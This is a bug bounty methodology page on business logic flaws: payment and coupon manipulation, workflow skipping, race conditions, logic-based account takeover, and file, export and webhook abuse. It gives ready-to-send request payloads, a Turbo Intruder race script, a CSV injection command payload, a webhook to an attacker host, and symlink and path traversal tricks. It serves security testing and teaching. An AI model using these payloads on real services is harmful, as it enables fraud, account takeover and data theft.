---
icon: lucide/brain
tags:
  - business-logic
  - race-conditions
  - payment-manipulation
  - workflow-bypass
  - bug-bounty
description: Business logic flaws are invisible to scanners. They require knowing what the application is supposed to do and testing whether it actually does it. No CVE, no payload, no tool — just intent and observation.
---

# Business Logic Flaws

Business logic flaws are the bugs that prove you understand the application, not just the technology. They are invisible to scanners because they require knowing what the application is *supposed* to do and then testing whether it *actually* does it. No CVE, no payload, no tool — just intent and observation. These bugs are consistently underreported and consistently well-paid because finding them requires a human who thought carefully.

---

<div class="grid cards" markdown>

-   :material-currency-usd-off:{ .lg .middle } __6.2 Price & Payment__

    ---

    Negative quantity, price tampering, currency confusion, coupon reuse, subscription bypass.

    [:octicons-arrow-right-24: Payment logic](#62-price--payment-manipulation)

-   :material-skip-next:{ .lg .middle } __6.3 Workflow & State__

    ---

    Multi-step skip, status parameter manipulation, forced browsing for business impact.

    [:octicons-arrow-right-24: Workflow](#63-workflow-and-state-bypass)

-   :material-clock-fast:{ .lg .middle } __6.4 Race Conditions__

    ---

    Single-packet attack, Turbo Intruder, double-spend, coupon reuse via concurrency.

    [:octicons-arrow-right-24: Race conditions](#64-race-conditions)

-   :material-account-switch:{ .lg .middle } __6.5 Account & Ownership Logic__

    ---

    Logic-based ATO, email confirmation bypass, org invitation abuse.

    [:octicons-arrow-right-24: Account logic](#65-account-and-ownership-logic)

-   :material-cog-play:{ .lg .middle } __6.6 Feature Abuse__

    ---

    File operations, import/export data exposure, webhook info leakage.

    [:octicons-arrow-right-24: Feature abuse](#66-feature-abuse-with-security-impact)

</div>

---

## The Mental Model

Before touching any feature, ask three questions:

```
1. What assumption does this feature make about user behavior?
2. What happens if I violate that assumption?
3. What is the worst outcome if the assumption is wrong?
```

**Assumptions worth violating:**

| Assumption | How to Violate |
|---|---|
| Users enter positive quantities | Try 0, -1, 0.001, 2147483648 |
| Users complete steps in order | Skip step 2, jump to final step |
| Discount codes are used once | Apply twice, or concurrently |
| Users won't modify price fields | Tamper the price in the request body |
| Free trial ends after 30 days | Re-register, extend, bypass |
| Action X requires verified email | Skip verification, access directly |
| One request = one operation | Send 20 concurrent identical requests |

---

## Decision Flow

```
App has checkout / payments / subscriptions?
→ Price manipulation first. Negative quantity, then price field tampering.

App has coupon or promo codes?
→ Apply twice sequentially, then apply twice concurrently (race condition).

App has a multi-step flow (checkout, onboarding, KYC)?
→ Map every step, then skip each one. Focus on business consequence.

App has org/team features?
→ Invite yourself as admin. Join without invite. Leave and retain access.

App has any time-sensitive or single-use operations?
→ Race condition. Single-packet attack via HTTP/2 in Burp.

App has file upload, import, or export?
→ Filename collision, data exposure in exports, CSV injection in imports.
```

---

## 6.2 Price & Payment Manipulation {#62-price--payment-manipulation}

### 6.2.1 Negative Quantity and Price Tampering

**When to use:** On any checkout flow that sends item details in the request body. The server should compute price server-side — if it trusts client-supplied values, it's vulnerable.

```bash title="quantity_and_price_tamper.sh"
# Standard checkout request:
POST /api/checkout
{"items": [{"product_id": "abc", "quantity": 1, "price": 99.99}]}

# Negative quantity — total may become negative:
{"items": [{"product_id": "abc", "quantity": -1, "price": 99.99}]}

# Zero quantity — order for free:
{"items": [{"product_id": "abc", "quantity": 0, "price": 99.99}]}

# Fractional quantity:
{"items": [{"product_id": "abc", "quantity": 0.001, "price": 99.99}]}
# May result in $0.10 charge for a $99.99 item

# Direct price tampering:
{"items": [{"product_id": "abc", "quantity": 1, "price": 0.01}]}
{"items": [{"product_id": "abc", "quantity": 1, "price": -99.99}]}

# Integer overflow (32-bit signed int max + 1 wraps to negative):
{"items": [{"product_id": "abc", "quantity": 2147483648, "price": 99.99}]}
```

**What to observe after each attempt:**

| Response | Meaning |
|---|---|
| Total changes in response | Server is trusting client value |
| Order placed at modified amount | Vulnerable — document immediately |
| Negative total processed as credit | Critical finding |
| Error with stack trace | Info disclosure — note for later |

---

### 6.2.2 Currency Confusion

**When to use:** On any app that supports multiple currencies.

```bash title="currency_confusion.sh"
# View product priced in USD, switch currency to lower-value at payment:
POST /api/checkout
{"amount": 100, "currency": "KES"}   # 100 KES ≈ $0.77 vs $100 USD

# Additional tests:
# Remove currency field entirely → does app default to cheapest?
{"amount": 100}

# Invalid currency code → error may reveal backend logic:
{"amount": 100, "currency": "INVALID"}

# Switch currency between cart and payment steps:
# Cart: {"currency": "USD"}
# Payment: {"currency": "BTC"}  → different valuation entirely
```

---

### 6.2.3 Coupon and Discount Abuse

**When to use:** On every coupon/discount system. Run sequential tests first, then concurrent (race condition — see 6.4).

```bash title="coupon_abuse.sh"
# 1. Same coupon applied twice (sequential):
POST /api/cart/coupon {"code": "SAVE20"}
POST /api/cart/coupon {"code": "SAVE20"}
# Does discount stack? ($20 off twice = $40?)

# 2. Stack multiple different coupons:
POST /api/cart/coupon {"code": "SAVE20"}
POST /api/cart/coupon {"code": "FREESHIP"}
POST /api/cart/coupon {"code": "EXTRA10"}
# Combined to 100%+ discount?

# 3. Expired coupon:
POST /api/cart/coupon {"code": "EXPIRED2024"}
# Does server validate expiry or just check if code exists?

# 4. Coupon reuse after order cancellation:
# Apply coupon → place order → cancel → try coupon again
# Should invalidate — often doesn't

# 5. Coupon for wrong product category:
# Coupon scoped to "electronics" → apply to non-electronics
# Does server validate the restriction?
```

---

### 6.2.4 Free Trial and Subscription Bypass

```bash title="subscription_bypass.sh"
# 1. Re-register after trial expires using email variations:
# user+1@gmail.com, user+2@gmail.com → same inbox, treated as different accounts

# 2. Client-supplied date tampering:
PUT /api/subscription {"trial_end": "2030-12-31", "status": "active"}
# Does server trust client-supplied dates?

# 3. Access premium features after trial expires:
# Let trial expire → directly access /api/premium/features
# Does server re-validate subscription on every request?

# 4. Downgrade but retain features:
# Downgrade plan → check if premium features are still accessible
# Frontend hides them — does backend enforce?

# 5. Plan parameter at registration:
POST /api/users/register {"email": "x@x.com", "plan": "enterprise"}
# Does server validate plan at registration or trust client value?
```

---

## 6.3 Workflow and State Bypass

### 6.3.1 Multi-Step Process Skip

**When to use:** On any multi-step flow. Map every step with Burp running, then attempt to skip or reorder them. The server should validate preconditions at every step — most don't.

**Common flows to test:**

=== "Checkout"

    ```
    Normal: Cart → Shipping → Payment → Confirm

    Attack: Skip Payment → navigate directly to Confirm
    Does the app place a free order?

    Look for:
    - payment_intent_id in step 3 — can you forge or reuse one?
    - Step indicator in request: {"step": 2} → try {"step": 4}
    - Direct URL: GET /checkout/step3 → try GET /checkout/complete
    ```

=== "Verification"

    ```
    Normal: Register → Verify email → Access account

    Attack: Skip verification → access /dashboard directly
    Does the app require verified email for every authenticated action
    or only on the first login?

    Also test:
    - Access sensitive actions (change password, add payment) without verified email
    - API endpoints accessible with unverified session
    ```

=== "KYC / Identity"

    ```
    Normal: Submit documents → Admin approval → Access financial features

    Attack: Skip approval step → try accessing financial features directly
    Is step 2 enforced server-side or just hidden in the UI?

    Also test:
    - Status field tamper: PATCH /api/kyc {"status": "approved"}
    - Direct access: GET /api/financial/transfer before KYC complete
    ```

=== "Password change"

    ```
    Normal: Enter current password → Enter new password

    Attack: Skip current password verification
    POST /api/password/change {"new_password": "hacked"} (no current_password field)

    Is current password verified server-side before allowing change?
    ```

---

### 6.3.2 Status Parameter Manipulation

**When to use:** On any PUT/PATCH request that includes a status field. Try setting it to every valid status value.

```bash title="status_tamper.sh"
# Order status:
PUT /api/orders/1042 {"status": "shipped"}    # mark own order shipped
PUT /api/orders/1042 {"status": "refunded"}   # trigger self-refund
PUT /api/orders/1042 {"status": "completed"}  # bypass pending state

# Account status:
PATCH /api/users/me {"verified": true}         # self-verify without email
PATCH /api/users/me {"is_premium": true}       # self-upgrade
PATCH /api/users/me {"kyc_status": "approved"} # self-approve KYC

# Ticket/task status:
PUT /api/tickets/55 {"status": "closed"}       # close before resolution
PUT /api/tasks/88  {"status": "approved"}      # self-approve

# Pattern: find any status field in PUT/PATCH
# Try: every valid status value + invalid values + empty string
# Look for: privilege escalation, financial gain, bypassed verification
```

---

## 6.4 Race Conditions

When two or more requests are processed concurrently and share a resource, the application may process both before either has completed the state change that would prevent the second. A one-time coupon applied twice simultaneously. A $100 withdrawal processed twice from a $100 balance.

**The key question:** *Does the application check a condition and then act on it, with a gap between the check and the action where another request could interfere?*

### 6.4.1 High-Value Targets

| Target | Attack |
|---|---|
| One-time coupons / promo codes | Apply twice simultaneously |
| Gift card / voucher redemption | Redeem twice simultaneously |
| Referral bonuses | Trigger twice |
| Payment / transfer operations | Double-spend |
| Password reset token use | Use same token twice simultaneously |
| Like / vote limits | Vote twice simultaneously |
| Rate-limited actions | Bypass limit via concurrent requests |
| Account deletion + data export | Export during deletion window |

---

### 6.4.2 Single-Packet Attack (HTTP/2)

**The most reliable race condition technique.** HTTP/2 multiplexes multiple requests over a single TCP connection. Sending multiple requests in a single packet means they arrive simultaneously — eliminating the network jitter that causes false negatives in HTTP/1.1 testing.

```
In Burp Suite (2022.9+):
1. Send target request to Repeater
2. Duplicate the tab 10-20 times (same request in each)
3. Change protocol to HTTP/2 in each tab
4. Right-click tab group → "Send group in parallel (single-packet attack)"
5. All requests sent in one TCP packet → server processes truly simultaneously

Always prefer single-packet attack over Turbo Intruder for HTTP/2 targets.
```

---

### 6.4.3 Turbo Intruder (HTTP/1.1)

```python title="race_condition_script.py"
# Right-click request → Extensions → Turbo Intruder → Send to Turbo Intruder

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=20,
        requestsPerConnection=1,
        pipeline=False
    )
    # Queue same request 20 times:
    for i in range(20):
        engine.queue(target.req, gate='race')

    engine.openGate('race')  # release all simultaneously (last-byte sync)

def handleResponse(req, interesting):
    if req.status == 200 and 'success' in req.response:
        table.add(req)
    if 'coupon applied' in req.response.lower():
        table.add(req)
```

**Interpreting results:**

| Result | Meaning |
|---|---|
| Multiple 200s where only one should succeed | Race condition confirmed |
| Balance credited/debited multiple times | Confirmed — document and report |
| All requests except first return 400/409 | Not vulnerable |

---

### 6.4.4 PoC and Reporting

```
PoC structure:
1. Set up precondition (load coupon, set account balance, prepare token)
2. Send N concurrent requests (show Turbo Intruder config or single-packet setup)
3. Show multiple success responses (screenshot)
4. Show result: balance credited twice, coupon applied twice, etc.

Impact framing:
- Coupon reuse:     "Arbitrary discount — potential $0 purchases"
- Double-spend:     "Financial loss to platform proportional to transaction limit"
- Referral abuse:   "Infinite referral credit generation"
- Rate limit bypass:"Brute-force of OTP/token protected by rate limit"
- Vote abuse:       "Manipulation of ranking/reputation systems"
```

---

## 6.5 Account and Ownership Logic

### 6.5.1 Logic-Based Account Takeover

No JWT exploit, no SQL injection — just logic flaws that result in ATO.

=== "Email change without re-auth"

    ```bash title="email_change_ato.sh"
    # If no current password required to change email:
    PUT /api/users/me {"email": "attacker@evil.com"}
    # Change email → trigger password reset → ATO

    # Combined with IDOR (Part 3):
    PUT /api/users/1043 {"email": "attacker@evil.com"}
    # Change victim's email → trigger reset → ATO
    ```

=== "Account merge"

    ```
    1. Victim has account: victim@gmail.com
    2. Attacker changes their email to victim@gmail.com (pending verification)
    3. Victim logs in via OAuth using victim@gmail.com
    4. Does app merge accounts or link OAuth to attacker's account?

    Test both directions:
    - Change email to victim's → wait for OAuth login
    - Register first → OAuth login with same email
    (Same pattern as 2.4.4 — worth testing independently here)
    ```

=== "Reset without token"

    ```bash title="tokenless_reset.sh"
    # If reset is based only on user_id or email with no token:
    POST /api/reset {"user_id": 1043, "new_password": "hacked123"}
    # No token required → ATO for any known user_id
    ```

=== "Support bypass"

    ```bash title="support_bypass.sh"
    # "I can't log in" recovery flows:
    POST /api/support/reset-account {
      "email": "victim@target.com",
      "reason": "locked out"
    }
    # Does support flow verify identity before resetting?
    # Does it send to email, or return new credentials directly?
    ```

---

### 6.5.2 Email Confirmation Bypass

```bash title="email_confirm_bypass.sh"
# 1. Access features before confirming:
# Register → skip email click → navigate to /dashboard, /api/profile
# Does app enforce verification on all sensitive actions or just first login?

# 2. Confirm a different email than the token was issued for:
# Token issued for: your@email.com
# Modify in URL: /confirm?token=abc&email=victim@gmail.com
# Does app confirm the modified email or the token's original email?

# 3. Token not bound to email:
# Request token for email A → change email to B → use token
# Does it confirm email B?

# 4. Confirmation link reuse:
# Click link → confirmed → click same link again
# Does anything happen? Session fixation? Duplicate confirmation?

# 5. Predictable confirmation token:
# If tokens are sequential: /confirm?id=12345
# Confirm someone else's email by guessing their token ID
```

---

### 6.5.3 Organization and Invitation Logic

```bash title="org_logic_tests.sh"
# 1. Invite yourself with admin role:
POST /api/orgs/target-org/invite {"email": "attacker@evil.com", "role": "admin"}

# 2. Join without invite:
POST /api/orgs/target-org/join
# Is joining open? Or invite-token required?

# 3. Invite token reuse (multiple joiners):
# Use same invite link from two different accounts
# Does the link work for both?

# 4. Role escalation via re-invite:
# You're a "member" → manipulate invite accept request:
POST /api/orgs/accept-invite {"token": "xyz", "role": "admin"}

# 5. Cross-org resource access:
GET /api/orgs/orgB/members      # IDOR — you're in orgA
GET /api/orgs/orgB/projects

# 6. Leave org but retain access:
# Join → gain access → leave org
# Check if session/token invalidated after membership change
```

---

## 6.6 Feature Abuse with Security Impact

### 6.6.1 File Operation Logic

```bash title="file_logic_tests.sh"
# 1. Filename collision — overwrite other users' files:
# User A uploads: report.pdf
# User B uploads: report.pdf
# Does B's upload overwrite A's? Are files namespaced per user?

# 2. Delete other users' files via IDOR:
DELETE /api/files/5523  # belongs to another user?

# 3. Path traversal via filename:
# Upload filename: ../../config/evil.php
# Does app sanitize filenames before writing to disk?

# 4. Zip symlink attack:
# Create zip containing symlink → /etc/passwd
# Server extracts → follows symlink → reads sensitive file

# 5. Publicly accessible uploads without auth:
GET /uploads/user_1043_profile.jpg   # predictable path → info disclosure
# Are uploaded files behind authentication?

# 6. Storage quota bypass:
# Negative file size in upload request?
# Does it bypass quota check?
```

---

### 6.6.2 Import/Export Data Exposure

```bash title="import_export_tests.sh"
# 1. Export contains more fields than UI shows:
# Request export of your own data → compare CSV/JSON fields to what UI displays
# Exports often include: hashed passwords, internal IDs, admin notes,
# 2FA secrets, IP logs, linked accounts, audit trail

# 2. Export another user's data via IDOR:
GET /api/export?user_id=1043&format=csv
# Export responses often contain more sensitive data than normal API responses

# 3. Import overwrites existing records via ID collision:
POST /api/import {"data": [{"id": 1043, "email": "attacker@evil.com"}]}
# Does import update records belonging to other users?

# 4. CSV injection in import fields:
# Field value: ="=cmd|' /C calc'!A0"
# When admin opens exported CSV in Excel → code executes on admin's machine
# Impact: admin's machine, not server-side — but still reportable

# 5. Race condition during bulk export:
# Trigger export during bulk operation → may include other users' records
```

---

### 6.6.3 Notification and Webhook Logic

```bash title="webhook_tests.sh"
# 1. Webhook receives other users' data:
POST /api/settings/webhook {"url": "https://attacker.com/hook"}
# Does webhook fire for YOUR events only, or also org/global events?
# Inspect payload — does it include other users' data?

# 2. Subscribe to notifications for resources you don't own:
POST /api/notify {"resource_id": 1043}   # IDOR — not your resource
# When resource 1043 is updated → you get notified → data leakage

# 3. Webhook payload leaks sensitive fields:
# Set up webhook → trigger various actions
# Does payload include: tokens, passwords, PII, internal IDs?
# Many webhook implementations leak more than intended

# 4. Send notifications to other users:
POST /api/notify/send {"user_id": 1043, "message": "Custom message"}
# Can you send arbitrary notifications to other users?
# Harassment vector, or phishing via trusted notification channel
```

---

## Part 6 Complete Checklist

??? note "Expand full checklist"

    ```
    PRICE & PAYMENT
    □ Negative quantity in checkout request
    □ Zero quantity — order processes for free?
    □ Direct price field tampering (client-supplied price trusted?)
    □ Integer overflow on quantity (2147483648)
    □ Currency parameter manipulation
    □ Same coupon applied twice (sequential and concurrent)
    □ Multiple different coupons stacked
    □ Coupon for wrong product category
    □ Expired coupon accepted?
    □ Coupon valid after order cancellation?
    □ Free trial re-registration via email variation
    □ Subscription status field tampered via PATCH

    WORKFLOW & STATE
    □ Every multi-step flow: skip step 2, skip to final step
    □ Checkout without payment step
    □ Account features accessible without email verification
    □ Status field in PUT/PATCH: try all valid status values
    □ Step indicators in requests: tamper step number
    □ KYC / verification gates: directly access restricted features

    RACE CONDITIONS
    □ One-time coupons/codes: concurrent application
    □ Gift card/voucher: concurrent redemption
    □ Payments/transfers: double-spend attempt
    □ Rate-limited actions: concurrent bypass
    □ HTTP/2 single-packet attack for all of the above
    □ Last-byte sync (Turbo Intruder gate) for HTTP/1.1 targets

    ACCOUNT LOGIC
    □ Email change without current password → trigger reset → ATO
    □ Email change to victim's email (pending) → account merge
    □ Password reset without token (user_id/email only)
    □ Email confirmation token: bound to email? Reusable? Predictable?
    □ Confirm different email than token was issued for
    □ Support/recovery flows: bypass verification?

    ORGANIZATION LOGIC
    □ Invite yourself with admin role
    □ Join org without invite
    □ Invite token reuse (multiple joiners)
    □ Leave org → retain access?
    □ Cross-org resource access via IDOR

    FILE OPERATIONS
    □ Filename collision → overwrite other users' files
    □ Delete other users' files via IDOR
    □ Filename path traversal (../../ in filename)
    □ Zip symlink attack
    □ Uploaded files publicly accessible without auth?
    □ Storage quota bypass via negative file size

    IMPORT/EXPORT
    □ Export contains more fields than UI shows
    □ Export other user's data via IDOR
    □ Import overwrites other users' records via ID collision
    □ CSV injection in import fields (admin opens in Excel)

    NOTIFICATIONS & WEBHOOKS
    □ Webhook receives other users' data
    □ Webhook payload leaks sensitive fields
    □ Subscribe to notifications for resources you don't own
    □ Send notifications to other users
    ```

---

## References

<div class="grid cards" markdown>

-   :simple-portswigger: __PortSwigger Labs__

    ---

    - [Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws)
    - [Race conditions](https://portswigger.net/web-security/race-conditions)

-   :octicons-book-16: __Research__

    ---

    - [James Kettle — Smashing the state machine (DEF CON 31)](https://portswigger.net/research/smashing-the-state-machine)
    - [OWASP Business Logic Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Business_Logic_Security_Cheat_Sheet.html)
    - [HackTricks — Business Logic](https://book.hacktricks.xyz/pentesting-web/business-logic-vulnerabilities)

</div>